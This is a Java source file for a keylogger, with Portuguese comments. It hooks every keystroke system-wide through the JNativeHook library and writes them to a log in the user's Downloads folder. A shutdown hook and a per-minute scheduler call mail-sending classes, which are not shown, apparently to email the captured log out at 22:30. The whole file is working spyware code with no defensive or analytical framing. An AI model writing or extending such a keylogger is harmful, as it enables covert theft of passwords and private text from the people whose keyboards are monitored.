package keylogger.com;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main implements NativeKeyListener {

    private static final String LOG_FILE = String.valueOf(Paths.get(System.getProperty("user.home") + "/Downloads/keylogger.log"));

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        char keyChar = e.getKeyChar();
        if (!Character.isISOControl(keyChar)) {
            writeToFile(String.valueOf(keyChar));
        }
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        switch (e.getKeyCode()) {
            case NativeKeyEvent.VC_ENTER:
                writeToFile("[Enter]\n");
                break;
            case NativeKeyEvent.VC_TAB:
                writeToFile("[Tab]\n");
                break;
            case NativeKeyEvent.VC_ESCAPE:
                writeToFile("[Esc]\n");
                break;
            case NativeKeyEvent.VC_BACKSPACE:
                writeToFile("[Backspace]");
                break;
            case NativeKeyEvent.VC_SPACE:
                writeToFile(" "); // espaço normal
                break;
            default:
                // Para Alt, Ctrl, Windows etc.
                if (keyText.length() > 1) {
                    writeToFile("[" + keyText + "]\n");
                }
                break;
        }
    }

    private void writeToFile(String text) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE, true))){
            writer.write(text);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) throws InterruptedException {
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Main());
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.err.println("\nShutdown Hook Registered!");
                SendMailLogger.sendMail();
            }));
            // agendador que verifica todo minuto
            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
            scheduler.scheduleAtFixedRate(() -> {
                SendDate.sendTime(22, 30); // Exemplo: enviar às 22:30 da noite
            }, 0, 1, TimeUnit.MINUTES);
        }catch (NativeHookException ex){
            ex.printStackTrace();
        }
    }

}
